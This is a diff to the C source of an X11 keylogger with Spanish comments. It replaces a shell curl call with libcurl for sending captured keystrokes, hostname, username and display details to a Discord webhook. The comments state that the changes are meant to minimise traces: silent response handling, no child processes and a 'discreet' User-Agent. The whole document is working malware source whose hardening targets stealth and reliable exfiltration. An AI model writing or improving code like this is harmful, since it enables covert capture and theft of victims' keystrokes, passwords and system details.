@@ -37,6 +37,7 @@
 #include <netdb.h>
 #include <errno.h>
 #include <sys/utsname.h>
+#include <curl/curl.h>
 
 #define LOG_FILE "keylog.txt"
 #define MAX_WINDOW_NAME 256
@@ -284,9 +285,55 @@ int exfil_base64_encode(const unsigned char *input, size_t input_len,
 }
 
 /**
- * Envía datos a Discord mediante webhook.
- * Intenta primero con socket HTTPS nativo (sin SSL).
- * Si falla, usa curl como fallback.
+ * Callback silencioso para libcurl - descarta toda la respuesta.
+ * Minimiza rastro al no escribir nada a stdout/stderr.
+ */
+static size_t curl_write_null(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    (void)ptr;
+    (void)userdata;
+    return size * nmemb;  // Simular que procesamos los datos
+}
+
+/**
+ * Escapa caracteres especiales en JSON de forma segura.
+ * Evita inyección de datos maliciosos en el payload JSON.
+ * 
+ * @param input Cadena de entrada
+ * @param output Buffer de salida (debe ser al menos 2x input)
+ * @param output_size Tamaño del buffer de salida
+ * @return Longitud de la cadena escapada
+ */
+static size_t json_escape_string(const char *input, size_t input_len,
+                                  char *output, size_t output_size) {
+    size_t j = 0;
+    for (size_t i = 0; i < input_len && j < output_size - 6; i++) {
+        unsigned char c = (unsigned char)input[i];
+        switch (c) {
+            case '"':  output[j++] = '\\'; output[j++] = '"'; break;
+            case '\\': output[j++] = '\\'; output[j++] = '\\'; break;
+            case '\n': output[j++] = '\\'; output[j++] = 'n'; break;
+            case '\r': output[j++] = '\\'; output[j++] = 'r'; break;
+            case '\t': output[j++] = '\\'; output[j++] = 't'; break;
+            case '\b': output[j++] = '\\'; output[j++] = 'b'; break;
+            case '\f': output[j++] = '\\'; output[j++] = 'f'; break;
+            default:
+                if (c < 0x20) {
+                    // Caracteres de control: escapar como \uXXXX
+                    j += snprintf(output + j, output_size - j, "\\u%04x", c);
+                } else {
+                    output[j++] = c;
+                }
+                break;
+        }
+    }
+    output[j] = '\0';
+    return j;
+}
+
+/**
+ * Envía datos a Discord mediante webhook usando libcurl.
+ * Implementación segura sin riesgo de inyección de comandos.
+ * Minimiza rastro: no crea procesos hijos, no usa shell.
  * 
  * @param webhook_url URL completa del webhook Discord
  * @param data Datos a enviar (sin codificar)
@@ -294,44 +341,93 @@ int exfil_base64_encode(const unsigned char *input, size_t input_len,
  * @return 0 en éxito, -1 si error
  */
 int discord_webhook_post(const char *webhook_url, const char *data, size_t data_len) {
-    if (!webhook_url || webhook_url[0] == '\0' || !data) {
+    if (!webhook_url || webhook_url[0] == '\0' || !data || data_len == 0) {
         return -1;
     }
     
-    // Intentar usar curl si está disponible (es más fiable para HTTPS)
-    char cmd_buffer[4096];
-    char escaped_data[1024];
+    CURL *curl;
+    CURLcode res;
+    int ret = -1;
     
-    // Escapar caracteres especiales en data para uso en shell
-    size_t j = 0;
-    for (size_t i = 0; i < data_len && j < sizeof(escaped_data) - 2; i++) {
-        if (data[i] == '"') {
-            escaped_data[j++] = '\\';
-            escaped_data[j++] = '"';
-        } else if (data[i] == '\n') {
-            escaped_data[j++] = '\\';
-            escaped_data[j++] = 'n';
-        } else if (data[i] == '\\') {
-            escaped_data[j++] = '\\';
-            escaped_data[j++] = '\\';
-        } else {
-            escaped_data[j++] = data[i];
+    // Buffer para JSON escapado (2x para escapado + overhead)
+    size_t escaped_size = data_len * 2 + 64;
+    char *escaped_data = malloc(escaped_size);
+    char *json_payload = NULL;
+    
+    if (!escaped_data) {
+        return -1;
+    }
+    
+    // Escapar datos para JSON de forma segura
+    size_t escaped_len = json_escape_string(data, data_len, escaped_data, escaped_size);
+    
+    // Construir payload JSON
+    size_t json_size = escaped_len + 32;  // {"content":"..."}
+    json_payload = malloc(json_size);
+    if (!json_payload) {
+        free(escaped_data);
+        return -1;
+    }
+    snprintf(json_payload, json_size, "{\"content\":\"%s\"}", escaped_data);
+    free(escaped_data);
+    
+    // Inicializar libcurl
+    curl = curl_easy_init();
+    if (!curl) {
+        free(json_payload);
+        return -1;
+    }
+    
+    // Configurar headers
+    struct curl_slist *headers = NULL;
+    headers = curl_slist_append(headers, "Content-Type: application/json");
+    
+    // Configurar opciones de curl para minimizar rastro
+    curl_easy_setopt(curl, CURLOPT_URL, webhook_url);
+    curl_easy_setopt(curl, CURLOPT_POST, 1L);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+    
+    // Callback silencioso - no escribe respuesta a ningún lado
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_null);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, NULL);
+    
+    // Desactivar señales para evitar interferencia con threads
+    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
+    
+    // Timeout razonable para no bloquear
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
+    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
+    
+    // Seguir redirecciones si Discord las usa
+    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 3L);
+    
+    // SSL/TLS configuración
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
+    
+    // User-Agent discreto
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, EXFIL_USER_AGENT);
+    
+    // Ejecutar request
+    res = curl_easy_perform(curl);
+    
+    if (res == CURLE_OK) {
+        long http_code = 0;
+        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
+        // Discord devuelve 204 No Content en éxito
+        if (http_code >= 200 && http_code < 300) {
+            ret = 0;
         }
     }
-    escaped_data[j] = '\0';
     
-    // Construir comando curl
-    snprintf(cmd_buffer, sizeof(cmd_buffer),
-        "curl -s -X POST -H 'Content-Type: application/json' "
-        "-d '{\"content\":\"%s\"}' '%s' >/dev/null 2>&1",
-        escaped_data, webhook_url);
+    // Limpiar recursos
+    curl_slist_free_all(headers);
+    curl_easy_cleanup(curl);
+    free(json_payload);
     
-    // Ejecutar curl en background
-    int ret = system(cmd_buffer);
-    
-    // system() retorna 0 si éxito, != 0 si error
-    // Retornamos 0 si se ejecutó, -1 si hay error grave
-    return (ret == -1) ? -1 : 0;
+    return ret;
 }
 
 /**
@@ -459,12 +555,19 @@ void exfil_add_to_buffer(const char *data, size_t len) {
 /**
  * Obtiene información del sistema para el mensaje inicial.
  * Incluye hostname, usuario, timestamp y configuración.
+ * Thread-safe: el llamador proporciona el búfer.
+ * 
+ * @param info_buffer Búfer donde escribir la información
+ * @param buffer_size Tamaño del búfer
  */
-char* exfil_get_system_info(void) {
-    static char info_buffer[1024];
+void exfil_get_system_info(char *info_buffer, size_t buffer_size) {
     char hostname[256];
     char username[256];
     char timestamp[64];
+    
+    if (!info_buffer || buffer_size == 0) {
+        return;
+    }
     
     // Obtener hostname
     if (gethostname(hostname, sizeof(hostname)) != 0) {
@@ -485,7 +588,7 @@ char* exfil_get_system_info(void) {
     get_timestamp(timestamp, sizeof(timestamp));
     
     // Construir mensaje informativo
-    snprintf(info_buffer, sizeof(info_buffer),
+    snprintf(info_buffer, buffer_size,
         "=== INICIO DE CAPTURA X11 ===\n"
         "Hora: %s\n"
         "Host: %s\n"
@@ -495,8 +598,6 @@ char* exfil_get_system_info(void) {
         "Modo: Discord Webhook\n"
         "=== DATOS CAPTURADOS ===\n",
         timestamp, hostname, username, g_state.display_env, g_state.exfil.exfil_interval);
-    
-    return info_buffer;
 }
 
 /**
@@ -508,7 +609,9 @@ void exfil_send_initial_message(void) {
         return;  // No es Discord o ya se envió el mensaje inicial
     }
     
-    char *system_info = exfil_get_system_info();
+    // Búfer en la pila para thread-safety
+    char system_info[1024];
+    exfil_get_system_info(system_info, sizeof(system_info));
     discord_webhook_post(g_state.exfil.discord_webhook, system_info, strlen(system_info));
     
     g_state.exfil.first_send = 0;  // Marcar como enviado
